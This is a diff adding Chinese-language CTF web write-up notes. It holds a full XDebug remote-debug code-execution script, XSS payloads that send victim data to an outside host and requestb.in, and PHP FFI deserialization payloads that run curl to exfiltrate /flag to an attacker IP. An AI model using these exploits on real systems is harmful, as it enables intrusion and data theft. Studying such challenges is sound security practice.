@@ -3540,6 +3540,235 @@ PCFET0NUWVBFIGh0bWw CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9
 	这篇文章靠谱点：https://blog.spoock.com/2017/09/19/xdebug-attack-surface/
 	不过的确可以直接看到返回的数据，用不着绕一圈弹shell，拿flag更重要
 
+	
+	来自 p 牛的脚本
+	#!/usr/bin/env python3
+	import re
+	import sys
+	import time
+	import requests
+	import argparse
+	import socket
+	import base64
+	import binascii
+	from concurrent.futures import ThreadPoolExecutor
+
+
+	pool = ThreadPoolExecutor(1)
+	session = requests.session()
+	session.headers = {
+		'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
+	}
+
+	def recv_xml(sock):
+		blocks = []
+		data = b''
+		while True:
+			try:
+				data = data + sock.recv(1024)
+			except socket.error as e:
+				break
+			if not data:
+				break
+
+			while data:
+				eop = data.find(b'\x00')
+				if eop < 0:
+					break
+				blocks.append(data[:eop])
+				data = data[eop+1:]
+
+			if len(blocks) >= 4:
+				break
+		
+		return blocks[3]
+
+
+	def trigger(url):
+		time.sleep(2)
+		try:
+			session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
+		except:
+			pass
+
+
+	if __name__ == '__main__':
+		parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
+		parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
+		parser.add_argument('-t', '--target', required=True, help='target url.')
+		parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
+		args = parser.parse_args()
+		
+		ip_port = ('0.0.0.0', args.listen)
+		sk = socket.socket()
+		sk.settimeout(10)
+		sk.bind(ip_port)
+		sk.listen(5)
+
+		pool.submit(trigger, args.target)
+		conn, addr = sk.accept()
+		conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
+
+		data = recv_xml(conn)
+		print('[+] Recieve data: ' + data.decode())
+		g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
+		if not g:
+			print('[-] No result...')
+			sys.exit(0)
+
+		data = g.group(1)
+
+		try:
+			print('[+] Result: ' + base64.b64decode(data).decode())
+		except binascii.Error:
+			print('[-] May be not string result...')
+
+
+# XCTF 4th-WHCTF-2017 Cat
+	输一个 127.0.0.1 得到了 ping 的结果
+	fuzz 了一波 ASCII 码，宽字节时出现了来自 Django 的报错
+	有可能是 php 通过 curl 将参数传给 Django 写的 API，然后显示结果
+
+	在报错信息中可以看到一部分代码	
+
+	/opt/api/dnsapi/views.py in ping
+	def ping(request): 
+		data = request.POST.get('url')
+		data = escape(data)
+		if not re.match('^[a-zA-Z0-9\-\./]+$', data):
+			return HttpResponse("Invalid URL")
+		return HttpResponse(os.popen("ping -c 1 \"%s\"" % data).read())
+
+	这里可以看到过滤还是比较严格的，很难命令注入
+
+	/opt/api/dnsapi/utils.py in escape
+	r = ''
+	for i in range(len(data)):
+		c = data[i]
+		if c in ('\\', '\'', '"', '$', '`'):
+			r = r + '\\' + c
+		else:
+			r = r + c
+	return r.encode('gbk') 
+
+	fuzz 过程中还发现一个字符 %40 即 @，没在白名单内，但没被 ban 掉（有点奇怪）
+	有了这个后可以带文件给 Django，然后在报错页面可以看到所有的参数
+	尝试读 etc/passwd 读不了，显示 invalid urldecode
+	读取 index.php 成功了
+	if (isset($_GET['url'])) {
+		$ch = curl_init("http://127.0.0.1:8000/api/ping");
+		$params = array("url"=>"$_GET[url]");
+
+		curl_setopt($ch, CURLOPT_HEADER, 0);  			// 输出不包含 header
+		curl_setopt($ch, CURLOPT_SAFE_UPLOAD, false);  	// 可以使用 @ 带文件
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $params);  // 传入参数
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回结果
+
+		$data = curl_exec($ch);
+		curl_close($ch);
+
+		echo htmlspecialchars($data);
+	}
+
+
+	读到完整的 view.py
+	import os, re
+	import functools
+	from django.core.files.uploadedfile import InMemoryUploadedFile
+	from django.http import HttpResponsefrom .utils import escape
+	def process_request(f): 
+		@functools.wraps(f) 
+		def wrapper(*args, **kwargs):     
+			request = args[0]  
+			# \xe5\x90\x88\xe5\xb9\xb6 requests.FILES      requests.POST     
+			for k, v in request.FILES.items():         
+				if isinstance(v, InMemoryUploadedFile):             
+					v = v.read()         
+					request.FILES[k] = v  
+					request.POST.update(request.FILES)     
+					return f(*args, **kwargs)
+				return wrapper
+
+	@process_request
+	def ping(request): 
+		# \xe8\xbd\xac\xe4\xb9\x89 
+		data = request.POST.get('url')
+		data = escape(data) 
+		if not re.match('^[a-zA-Z0-9\\-\\./]+$', data):     
+			return HttpResponse("Invalid URL")
+		return HttpResponse(os.popen("ping -c 1 \"%s\"" % data).read())'
+
+
+	debug 页面还有详细的配置信息，这里看到了 sqlite 的目录
+	DATABASES	
+	{'default': {'ATOMIC_REQUESTS': False,
+					'AUTOCOMMIT': True,
+					'CONN_MAX_AGE': 0,
+					'ENGINE': 'django.db.backends.sqlite3',
+					'HOST': '',
+					'NAME': '/opt/api/database.sqlite3',
+					'OPTIONS': {},
+					'PASSWORD': u'********************',
+					'PORT': '',
+					'TEST': {'CHARSET': None,
+							'COLLATION': None,
+							'MIRROR': None,
+							'NAME': None},
+					'TIME_ZONE': None,
+					'USER': ''}}
+'
+
+
+XCTF 3rd-HITB CTF-2017 website
+	注册页面，注册后可以提交 personal website，有个 getflag 按钮，点完之后 Your flag is : no admin, no flag XP
+	并没啥卵用，应该是 xss 打管理员，将链接设为自己的，发现并没有点这个链接，查看 js
+
+	// function getInfo() {
+	//
+	//     $.post("action.php",{},function(data,status){
+	//         var json=eval('('+data+')');
+	//         if(json.errorMessage!=null){
+	//             alert(json.errorMessage);
+	//             return false;
+	//         }
+	//         document.getElementById('uname').innerHTML = json.username;
+	//         document.getElementById('site').innerHTML = json.website;
+	//         document.getElementById('csrftoken').value=json.csrftoken;
+	//     });
+	//
+	// }
+
+	function getInfo(json) {
+		document.getElementById('uname').innerHTML = json.username;
+		document.getElementById('site').innerHTML = json.website;
+		document.getElementById('csrftoken').value=json.csrftoken;
+	}
+
+	function getFlag() {
+
+	$.post("getflag.php",
+		{
+			csrftoken:document.getElementById('csrftoken').value
+
+		},
+		function(data,status){
+			changeData(data);
+		});
+
+	}
+
+	function changeData(string) {
+		var obj=eval('('+string+')');
+		document.getElementById('flag').innerHTML=obj.flag;
+		document.getElementById('csrftoken').value=obj.csrftoken;
+	}
+
+	所以这题还是要构造 xss 打到管理员，注意到源码里还有个 callback
+	<script src="action.php?callback=getInfo"></script>
+
+	http://111.198.29.45:46327/action.php?callback=<script>document.location='//47.101.220.241:9001'</script>
+	http://47.88.218.105:20010/action.php?callback=%3Cscript%20src%3D%22https%3A%2f%2fajax.googleapis.com%2fajax%2flibs%2fjquery%2f2.1.3%2fjquery.min.js%22%3E%3C%2fscript%3E%3Cscript%3E%20%24.get%28%27%2floged.php%27%2Cfunction%28data%29%7B%24.post%28%27https%3A%2f%2frequestb.in%2fr0uyoer0%3Finsp%3D%27%2C%7Bname%3Adata%7D%29%3B%7D%29%3B%20%3C%2fscript%3E&quot
+
 
 # HITCON-2017 BabyFirst_Revenge
 	只能说终于碰到橘子这一题了，极限弹 shell
@@ -3768,6 +3997,11 @@ PCFET0NUWVBFIGh0bWw CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9
 
 
 # 2017 hitcon ctf ssrf me
+
+
+# 2018 hitcon one line php challenge
+	<?php
+	($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
 	
 
 
@@ -3841,5 +4075,205 @@ php 引用，配合反序列化
 		exit();
 	}
 
-# # 2019 CISCN 全宇宙最简单的 sql
+# 2019 CISCN 全宇宙最简单的 sql
 	根据执行报错/执行成功但登录失败两种回显状态不同，构造注入语句，类似于布尔盲注。
+
+
+
+# 来源未知，文件包含到 mysql 读文件
+	来自安全客分享 https://www.anquanke.com/post/id/173039
+
+	<?php
+	define(ROBOTS, 0);
+	error_reporting(0);
+
+	if(empty($_GET["action"])) {
+		show_source(__FILE__);
+	} else {
+		include $_GET["action"].".php";
+	}
+
+
+	<?php
+	if (!defined("ROBOTS")) {die("Access Denied");}
+	echo "Congratulate hack to here, But flag in /var/www/flag.flag";
+
+
+	<?php
+	if(file_exists("./install.lock")) {
+		die("Have installed!");
+	}
+
+	$host = $_REQUEST['host'];
+	$user = $_REQUEST['user'];
+	$passwd = $_REQUEST['passwd'];
+	$database = $_REQUEST['database'];
+
+	if(!empty($host) && !empty($user) && !empty($passwd) && !empty($database)) {
+		$conn = new mysqli($host, $user, $passwd);
+		if($conn->connect_error) {
+			die($conn->connect_error);
+		} else {
+			$conn->query("DROP DATABASE ".$database);
+			$conn->query("CREATE DATABASE ".$database);
+			//To be continued
+			mysqli_close($conn);
+
+
+			$config = "<?phpn$config=";
+			$config .= var_export(array("host"=>$host, "user"=>$user, "passwd"=>$passwd), TRUE).";";
+			file_put_contents(md5($_SERVER["REMOTE_ADDR"])."/config.php", $config);
+		}
+	}
+
+
+
+# 某入群题 473831530 
+	http://ctf473831530.yulige.top:12345/
+	<?php 
+	highlight_file(__FILE__);
+	function check_inner_ip($url) 
+	{ 
+		$match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); 
+		if (!$match_result) 
+		{ 
+			die('url fomat error'); 
+		} 
+		try 
+		{ 
+			$url_parse=parse_url($url); 
+		} 
+		catch(Exception $e) 
+		{ 
+			die('url fomat error'); 
+			return false; 
+		} 
+		$hostname=$url_parse['host']; 
+		$ip=gethostbyname($hostname); 
+		$int_ip=ip2long($ip); 
+		return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; 
+	} 
+
+	function safe_request_url($url) 
+	{ 
+		
+		if (check_inner_ip($url)) 
+		{ 
+			echo $url.' is inner ip'; 
+		} 
+		else 
+		{
+			$ch = curl_init(); 
+			curl_setopt($ch, CURLOPT_URL, $url); 
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+			curl_setopt($ch, CURLOPT_HEADER, 0); 
+			$output = curl_exec($ch); 
+			$result_info = curl_getinfo($ch); 
+			if ($result_info['redirect_url']) 
+			{ 
+				safe_request_url($result_info['redirect_url']); 
+			} 
+			curl_close($ch); 
+			var_dump($output); 
+		} 
+		
+	} 
+
+	$url = $_GET['url']; 
+	if(!empty($url)){ 
+		safe_request_url($url); 
+	} 
+
+	?>
+
+
+# 34c3CTF extract0r
+https://paper.tuisec.win/detail/aed0bb56df25952
+
+
+# 2019 RCTF nextphp
+	题目直接给了 eval 一句话后门，一般就是绕 disable_function 了
+	先看一下 phpinfo，发现是 php 7.4，自然就需要用到些新特性了
+	再看下 open_basedir 限定在了 html 目录，这里可以用几个办法绕过
+	$_=[];$i=new DirectoryIterator("glob:///*");foreach($i as $t){$_[]=$t->__toString();};print_r($_);
+	可以看到根目录下的 flag，接下来就是读文件了
+
+	同目录下还有个 preload.php
+	final class A implements Serializable {
+		protected $data = [
+			'ret' => null,
+			'func' => 'print_r',
+			'arg' => '1'
+		];
+	
+		private function run () {
+			$this->data['ret'] = $this->data['func']($this->data['arg']);
+		}
+	
+		public function __serialize(): array {
+			return $this->data;
+		}
+	
+		public function __unserialize(array $data) {
+			array_merge($this->data, $data);
+			$this->run();
+		}
+	
+		public function serialize (): string {
+			return serialize($this->data);
+		}
+	
+		public function unserialize($payload) {
+			$this->data = unserialize($payload);
+			$this->run();
+		}
+	
+		public function __get ($key) {
+			return $this->data[$key];
+		}
+	
+		public function __set ($key, $value) {
+			throw new \Exception('No implemented');
+		}
+	
+		public function __construct () {
+			throw new \Exception('No implemented');
+		}
+	}
+
+	新特性，FFI，自己改一下
+	final class A implements Serializable {
+		protected $data = [
+			'ret' => null,
+			'func' => 'FFI::cdef',
+			'arg' => "int php_exec(int type, char *cmd);"
+			// 'arg' => 'int system(const char *command);'
+		];
+	
+		public function serialize (): string {
+			return serialize($this->data);
+		}
+	
+		public function unserialize($payload) {
+			$this->data = unserialize($payload);
+			$this->run();
+		}
+	
+		public function __construct () {
+		}
+	}
+	
+	$a = new A;
+	echo serialize($a);
+
+	$a=unserialize('C:1:"A":97:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:34:"int php_exec(int type, char *cmd);";}}');var_dump($a->ret->php_exec(2,'curl%2047.101.220.241:9001/`cat%20/flag`'));
+	$a=unserialize('C%3a1%3a"A"%3a97%3a{a%3a3%3a{s%3a3%3a"ret"%3bN%3bs%3a4%3a"func"%3bs%3a9%3a"FFI%3a%3acdef"%3bs%3a3%3a"arg"%3bs%3a34%3a"int+php_exec(int+type,+char+*cmd)%3b"%3b}}');var_dump($a->ret->php_exec(2,'curl%2047.101.220.241:8001%20-F%20f=@/flag'));
+
+# 2019 RCTF
+
+
+# 2019 RCTF
+# 2019 RCTF
+# 2019 RCTF
+
+
